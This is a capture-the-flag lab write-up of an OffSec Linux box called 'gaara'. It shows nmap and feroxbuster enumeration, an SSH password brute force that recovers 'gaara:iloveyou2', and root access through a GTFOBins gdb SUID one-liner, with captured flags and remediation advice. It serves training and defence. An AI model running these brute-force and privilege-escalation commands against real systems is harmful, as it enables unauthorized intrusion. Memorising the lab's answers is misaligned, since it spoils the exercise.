---
title: gaara
date started: 2026-02-24 15:39:48
date completed: 2026-02-24 16:31:32
platform: Offsec
difficulty: Easy
os: Linux
tags:
  [
    vulnerabilty assessment,
    SSH bruteforce,
    SUID,
    SSH,
    bruteforce,
    misconfiguration,
  ]
---

# Scope

> In this lab, you will exploit a system by brute-forcing credentials for the SSH service and escalating privileges by abusing misconfigured SUID permissions on /usr/bin/gdb. The lab highlights scenarios involving password brute-forcing and leveraging SUID binaries for privilege escalation. This works better with VirtualBox rather than VMware.

## 192.168.157.142

# Enumeration

## Ports

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

## Services

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 3ea36f6403331e76f8e498febee98e58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS8evJ7ywX5kz396YcIuR+rucTJ/OAK1SSpQoyx6Avj3v1/ZeRvikDEBZRZE4KMV4/+LraxOvCIb0rkU98B5WME6IReWvGTbF99x6wc2sDCG5haD5/OI6At8xrEQPV
6FL8NqipouEeYXU5lp/aR7vsdJAs/748uo6Xu4xwUWKFit3RvCHAdhuNfXj5bpiWESerc6mjRm1dPIwIUjJb2zBKTMFiVxpl8R3BXRLV7ISaKQwEo5zp8OzfxDF0YQ5WxMSaKu6fsBh/XDHr+m2A7TLPfIJPS2i2Y8EPxy
mUahuhSq63nNSaaWNdSZwpbL0qCBPdn1jtTjh26fGbmPeFVdw1
|   256 6c0eb500e742444865effed77ce664d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPFPC21nXnF1t6XmiDOwcXTza1K6jFzzUhlI+zb878mxsPin/9KvLlW9up9ECWVVTKbiIieN8cD0rF7wb3EjkHA=
|   256 b751f2f9855766a865542e05f940d2f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBprcu3jXo9TbgN5tBKvrojw4OFUkQIH+dITgacg3BLV
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP (tcp 80)

- Going to the web server on port 80 shows an image, and nothing else:

![gaara home page](.images/img_20260224_154921.png)

- Whatweb check:

```bash
[Feb 24, 2026 - 16:00:45 (+08)] exegol-offsec recon # whatweb $TARGET
http://192.168.157.142 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.157.142], Title[Gaara]
```

- Directory busting for hidden links wasn't successful

```bash
[Feb 24, 2026 - 16:00:51 (+08)] exegol-offsec recon # feroxbuster -w `fzf-wordlists` -u "http://$TARGET/"

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.157.142/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/lists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      761l     2542w   219002c http://192.168.157.142/gaara.jpg
200      GET        5l        8w      137c http://192.168.157.142/
[####################] - 8s     20480/20480   0s      found:2       errors:7
[####################] - 7s     20479/20479   3000/s  http://192.168.157.142/
```

- Busting for files wasn't successful either.
- Looking for subdomains with FFUF and Gobuster wasn't successful.

### SSH (tcp 22)

- Using Nmap's NSE-Script `ssh-brute` was able to bruteforce some credentials using the username `gaara`.

```bash
[Feb 24, 2026 - 16:17:06 (+08)] exegol-offsec recon # nmap --script=ssh-brute --script-args userdb=./users.txt,passdb=/usr/share/wordlists/rockyou.txt $TARGET -p 22

<SNIP>

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|   Accounts:
|     gaara:iloveyou2 - Valid credentials
|_  Statistics: Performed 207 guesses in 175 seconds, average tps: 1.6
```

# Exploit

- Access was gained via SSH, using weak credentials `gaara:iloveyou2`

```bash
[Feb 24, 2026 - 16:20:24 (+08)] exegol-offsec recon # ssh gaara@192.168.157.142
The authenticity of host '192.168.157.142 (192.168.157.142)' can't be established.
ED25519 key fingerprint is SHA256:XpX1VX2RtX8OaktJHdq89ZkpLlYvr88cebZ0tPZMI0I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.157.142' (ED25519) to the list of known hosts.
gaara@192.168.157.142's password:
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ whoami
gaara
```

# Internal Enumeration

```bash
gaara@Gaara:~$ whoami
gaara
gaara@Gaara:~$ uname
Linux
gaara@Gaara:~$ uname -a
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
gaara@Gaara:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:30:5c brd ff:ff:ff:ff:ff:ff
    inet 192.168.157.142/24 brd 192.168.157.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:305c/64 scope link
       valid_lft forever preferred_lft forever
gaara@Gaara:~$ cd /
gaara@Gaara:/$ ls /home
gaara
gaara@Gaara:/$ cd /home/gaara/
gaara@Gaara:~$ ls
flag.txt  local.txt
gaara@Gaara:~$ grep * ./*.txt
gaara@Gaara:~$ cat flag.txt
Your flag is in another file...
gaara@Gaara:~$ cat local.txt
acb1f304f03b9022aa318a722890eb92
gaara@Gaara:~$
```

- Nothing that leads to privesc in webroot

```bash/Temari
/Kazekage
/iamGaara
gaara@Gaara:/var/www/html$ ls
Cryoserver  gaara.jpg  iamGaara  index.html  Kazekage  Temari
gaara@Gaara:/var/www/html$
```

- Looking for SUID/SGIDs

```bash
gaara@Gaara:/$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

# Privilege Escalation

- There are 2 binaries that aren't a part of a default linux config. `gdb, and gimp-2.0`.
- Going to [GTFO Bins](https://gtfobins.org/gtfobins/gdb/#shell) exposes a way to upgrade the user gaara to root, by bypassing the usual kernel permissions if the SUID bit is set.

```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```

- This gets root access to the machine

```bash
gaara@Gaara:/$ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
# cd /root
# ls
proof.txt  root.txt
# cat proof.txt
***************5b5c350326607b7b6
# cat root.txt
Your flag is in another file...
```

# Remediation

## Weak password

The initial foothold was gained using a weak password that was easily brute forced. This issue can be fixed by:

1. Enforcing strong password policies, where passwords are at least 15-20 characters long, and a mix of uppercase, lowercase, numbers and symbols. Encourage the use of passphrases, and forbid the use of common dictionary-based passwords.
2. Account lockouts after x amount of failed tries.
3. Rate limiting, where the source IP address is blocked after x amount of tries to stop automated attacks.
4. Salt and hash passwords to protect against database breaches.

## SUID Misconfiguration

- This a misconfiguration where a special permission (SUID bit) is given to a binary to run as the `user who created it (file owner)`, not the user launching it.
- This allows for local privilege escalation where any user who already has local access to a target might run a binary as root for example, and have it spawn a root shell, or do other things with an elevated set of permissions.

This is fixed by:

- Reducing the number of SUID binaries.
  - Remove unwanted packages and tools such as convenience utils that require admin rights.
  - Don't ship debugging helpers with elevated permissions
  - Review vendor actions (remote tools, support agents) with the extra scrutiny.

- Prefer Least Privilege over "run as root"
  - Linux capabilities (grant only the specific privilege needed)
  - privileged helper services with strict, authenticated IPC
  - well-scoped sudo rules for specific commands (with a controlled environment)

- Lock down service workflows
  - Require authentication for service mode (no “hidden password” culture).
  - Make service access time-bounded and logged.
  - Ensure exported logs/data are access-controlled and sanitized where needed.

# Lessons Learnt

- When checking for SUID/SGID bits set in binaries. Look for non-default binaries on linux machines.
- Do a full enumeration of subdomains, hidden links, files, etc before trying to brute force SSH.
